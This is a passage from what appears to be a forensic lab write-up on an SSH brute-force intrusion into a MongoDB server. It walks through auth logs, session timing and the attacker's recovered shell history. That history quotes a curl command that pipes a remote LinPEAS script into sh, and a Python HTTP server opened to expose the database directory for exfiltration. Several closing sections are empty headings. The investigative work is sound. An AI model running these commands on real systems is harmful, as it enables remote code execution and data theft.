2025-12-29T05:39:23.731304+00:00 ip-172-31-38-170 sshd[39872]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.776120+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:23.829259+00:00 ip-172-31-38-170 sshd[39873]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:23.951868+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.005606+00:00 ip-172-31-38-170 sshd[39874]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.067192+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.081971+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.085379+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.086370+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088632+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088863+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.091298+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.092043+00:00 ip-172-31-38-170 sshd[39826]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.092755+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.097350+00:00 ip-172-31-38-170 sshd[39830]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.099331+00:00 ip-172-31-38-170 sshd[39827]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.108758+00:00 ip-172-31-38-170 sshd[39830]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55126 [preauth]
2025-12-29T05:39:24.108846+00:00 ip-172-31-38-170 sshd[39827]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55096 [preauth]
2025-12-29T05:39:24.108889+00:00 ip-172-31-38-170 sshd[39826]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55090 [preauth]
2025-12-29T05:39:24.210906+00:00 ip-172-31-38-170 sshd[39875]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.269457+00:00 ip-172-31-38-170 sshd[39878]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.273306+00:00 ip-172-31-38-170 sshd[39876]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:39:24.279681+00:00 ip-172-31-38-170 sshd[39882]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.286885+00:00 ip-172-31-38-170 sshd[39879]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.289290+00:00 ip-172-31-38-170 sshd[39881]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:24.289574+00:00 ip-172-31-38-170 sshd[39880]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=65.0.76.43  user=mongoadmin
2025-12-29T05:39:25.596404+00:00 ip-172-31-38-170 sshd[39816]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.598101+00:00 ip-172-31-38-170 sshd[39816]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54976 [preauth]
2025-12-29T05:39:25.694370+00:00 ip-172-31-38-170 sshd[39818]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.695961+00:00 ip-172-31-38-170 sshd[39818]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54988 [preauth]
2025-12-29T05:39:25.870560+00:00 ip-172-31-38-170 sshd[39819]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.872303+00:00 ip-172-31-38-170 sshd[39819]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55002 [preauth]
2025-12-29T05:39:25.880047+00:00 ip-172-31-38-170 sshd[39824]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.881891+00:00 ip-172-31-38-170 sshd[39824]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55040 [preauth]
2025-12-29T05:39:25.938496+00:00 ip-172-31-38-170 sshd[39829]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.940446+00:00 ip-172-31-38-170 sshd[39829]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55112 [preauth]
2025-12-29T05:39:25.941340+00:00 ip-172-31-38-170 sshd[39822]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.943193+00:00 ip-172-31-38-170 sshd[39822]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55018 [preauth]
2025-12-29T05:39:25.949031+00:00 ip-172-31-38-170 sshd[39823]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.950631+00:00 ip-172-31-38-170 sshd[39823]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55034 [preauth]
2025-12-29T05:39:25.955047+00:00 ip-172-31-38-170 sshd[39817]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.958028+00:00 ip-172-31-38-170 sshd[39820]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.959241+00:00 ip-172-31-38-170 sshd[39821]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:25.959329+00:00 ip-172-31-38-170 sshd[39817]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 54978 [preauth]
2025-12-29T05:39:25.959975+00:00 ip-172-31-38-170 sshd[39820]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55006 [preauth]
2025-12-29T05:39:25.960736+00:00 ip-172-31-38-170 sshd[39821]: Connection closed by authenticating user mongoadmin 65.0.76.43 port 55014 [preauth]
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:48:28.249844+00:00 ip-172-31-38-170 sshd[40027]: Received disconnect from 65.0.76.43 port 46062:11: disconnected by user
2025-12-29T05:48:28.250045+00:00 ip-172-31-38-170 sshd[40027]: Disconnected from user mongoadmin 65.0.76.43 port 46062
```

Two things stand out here. First, between roughly `05:39:19` and `05:39:26` — a window of about **7 seconds** — there are well over a hundred `authentication failure` events for the same user, `mongoadmin`, all from `65.0.76.43`, each one running under a _different_ SSH process ID (`sshd[39844]`, `sshd[39845]`, `sshd[39846]`, and so on). 

A human typing a password wrong repeatedly would generate failures one at a time, sequentially, under a single connection. Dozens of simultaneous connection attempts, each with its own process ID, all within a few seconds, is the signature of an automated brute-force tool — a script that opens many parallel SSH connections at once and rapidly tries different passwords across all of them.

Second, buried inside the auth failures are two lines that don't say `authentication failure` — they say `Accepted keyboard-interactive/pam`, meaning a correct password was eventually supplied and SSH let the connection through:

- `sshd[39825]` — accepted at `05:39:24.276756`, right in the middle of the brute-force burst.
- `sshd[39962]` — accepted at `05:40:03.475659`, about 39 seconds after the burst died down.

The first accepted session (`39825`) doesn't show a matching disconnect line in this IP-filtered view — which makes sense, since a session's closing message doesn't always repeat the remote IP address, so a plain IP search can miss it. To see that session's complete lifecycle in isolation from all the surrounding noise, the next step is to filter `auth.log` by its specific process ID instead of the IP.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

**Command:** `grep "39825" auth.log`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ grep "39825" auth.log                             
2025-12-29T05:39:21.879041+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.088863+00:00 ip-172-31-38-170 sshd[39825]: error: PAM: Authentication failure for mongoadmin from 65.0.76.43
2025-12-29T05:39:24.276756+00:00 ip-172-31-38-170 sshd[39825]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 55056 ssh2
2025-12-29T05:39:24.280444+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:39:24.861336+00:00 ip-172-31-38-170 sshd[39825]: pam_unix(sshd:session): session closed for user mongoadmin
```

This gives us the complete lifecycle of session `39825`: two failed password guesses, then a correct one accepted at `05:39:24.276756`, a session opened four milliseconds later at `.280444`, and — critically — that same session closed at `05:39:24.861336`. From accepted to closed is under **six-tenths of a second**. No human logs in, does something, and logs out again in half a second — that's consistent with an automated tool confirming a cracked credential works and then dropping the connection, not someone sitting at a keyboard actually using the access.

That rules out `39825` as the hands-on session. The remaining candidate is `39962`, accepted at `05:40:03`. The same technique — filtering by its PID — will show whether that session behaves differently.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

**Command:** `grep "39962" auth.log`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/var/log]
└─$ grep "39962" auth.log 
2025-12-29T05:40:03.475659+00:00 ip-172-31-38-170 sshd[39962]: Accepted keyboard-interactive/pam for mongoadmin from 65.0.76.43 port 46062 ssh2
2025-12-29T05:40:03.477802+00:00 ip-172-31-38-170 sshd[39962]: pam_unix(sshd:session): session opened for user mongoadmin(uid=1001) by mongoadmin(uid=0)
2025-12-29T05:48:28.250833+00:00 ip-172-31-38-170 sshd[39962]: pam_unix(sshd:session): session closed for user mongoadmin
```

This is a completely different pattern from `39825`. Here, the session was accepted at `05:40:03.475659`, opened two milliseconds later, and stayed open until it finally closed at `05:48:28.250833` — a gap of roughly **8 minutes and 25 seconds**. A session held open for that long is consistent with a real, hands-on interactive use of the terminal: someone typing commands, looking around the system, waiting between actions — not a script that authenticates and immediately exits.

Combined with what was ruled out in `39825` (accepted-and-closed in under a second, indicating automated credential validation rather than actual use), this identifies `39962` as the session where the attacker actually sat down and used their access.

The attacker gained interactive hands-on remote access at **2025-12-29 05:40:03 UTC** (the moment session `39962` was accepted and opened), and remained connected until `05:48:28 UTC`, roughly 8 minutes and 25 seconds later.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 7

### Identify the exact command line the attacker used to execute an in‑memory script as part of their privilege‑escalation attempt.

**==curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

You've now established that the attacker had roughly 8 minutes of genuine, hands-on terminal access as the `mongoadmin` user, starting at `05:40:03`. The natural next question is: what did they actually type during that window?

When a user works interactively in a Bash shell, every command they run gets recorded, line by line, into a file called `.bash_history`, sitting in that user's home directory. The leading dot in the filename makes it a "hidden" file — a Linux convention where files/folders starting with `.` are skipped by default when you list a directory with plain `ls` (you'd need `ls -a` to see it), but tools like `cat` can still read it directly if you already know its name, which we do.

You already confirmed `home/mongoadmin` exists under `[root]/` in the tree structure, so that's exactly where to look.

**Next step:** Read that file. From inside the `[root]/home/mongoadmin` folder, run:

**Command:** `cat .bash_history`

**Result:**

```shell
┌──(kali㉿kali)-[~/…/uac-mongodbsync-linux-triage/[root]/home/mongoadmin]
└─$ cat .bash_history 
ls -la
whoami
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

Reading through this chronologically: the attacker first ran basic reconnaissance (`ls -la`, `whoami` — checking what's in the current folder and confirming which user they're logged in as), then immediately ran a `curl` command piping into `sh`, before moving on to explore `/data`, the home directory, and eventually `/var/lib/mongodb/`.

That `curl ... | sh` line is the one Task 7 is asking about — but before documenting exactly why it counts as an "in-memory" script execution, it's worth identifying what `linpeas.sh` actually is, since that's a new tool showing up in this investigation. **Can you Google `linpeas privilege escalation script` and paste what you find?** Once we have that, I'll break down exactly how the `curl | sh` construction works and why it qualifies as in-memory execution.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Task 8

### The attacker was interested in a specific directory and also opened a Python web server, likely for exfiltration purposes. Which directory was the target?

**==Answer==**
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

Task 7 already surfaced the full contents of `mongoadmin`'s `.bash_history` — no new command is needed here, since the answer is sitting further down in that same file you already retrieved. Picking up where the LinPEAS line left off, here's the remainder of that history:

```shell
cd /data
cd ~
ls -al
cd /
ls
cd /var/lib/mongodb/
ls -la
cd ../
which zip
apt install zip
zip
cd mongodb/
python3
python3 -m http.server 6969
exit
```

Walking through this in order: after running LinPEAS, the attacker poked around a few generic locations (`/data`, their home directory, `/`) before settling on `/var/lib/mongodb/` and listing its contents. This path is significant — **`/var/lib/mongodb` is MongoDB's default data directory**, meaning it's not just "a folder the database can read," it's where MongoDB physically stores its actual database files on disk (the raw BSON-format documents, indexes, and WiredTiger storage-engine files that make up every collection). Reading data through the MongoDB network protocol only gets you whatever you can successfully query; having the raw files from this directory means having an entire offline copy of everything in the database, with no query restrictions at all.

From there, the sequence `cd ../` (back up to `/var/lib/`), followed by `which zip` (checking whether the `zip` archiving tool is installed) and `apt install zip` (installing it, since it apparently wasn't), followed by `zip` and `cd mongodb/` (moving back down into the target folder) shows a clear intent: bundle that directory's contents into a single compressed archive, presumably to make it easier to transfer off the box in one file rather than many.

The final two commands confirm the mechanism used to actually move data out:

- `python3` — launched the Python interpreter, likely just to confirm it was available and working.
- `python3 -m http.server 6969` — this is Python's **built-in HTTP server module**. Running it with no other arguments starts a bare-bones web server that serves the _current working directory's_ files to anyone who connects to it over HTTP, on the specified port (`6969` here). Since Python 3 comes pre-installed on virtually every modern Linux system, this requires no extra tools and no authentication whatsoever — literally anyone who can reach that port over the network can browse to it and download whatever files are sitting in that folder. It's a fast, low-effort way to exfiltrate data without needing to set up something more elaborate like an FTP server or a reverse file transfer.

Because that server command was run _after_ the `cd mongodb/` line (i.e., the attacker had navigated back down into `/var/lib/mongodb/` at that point), the directory actually being served — and therefore the target of the exfiltration attempt — was `/var/lib/mongodb` — MongoDB's data directory — which they attempted to archive with zip and then exposed via a Python HTTP server (python3 -m http.server 6969) for exfiltration.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## Lessons Learned
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->

## Remediation Recommendations
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## References

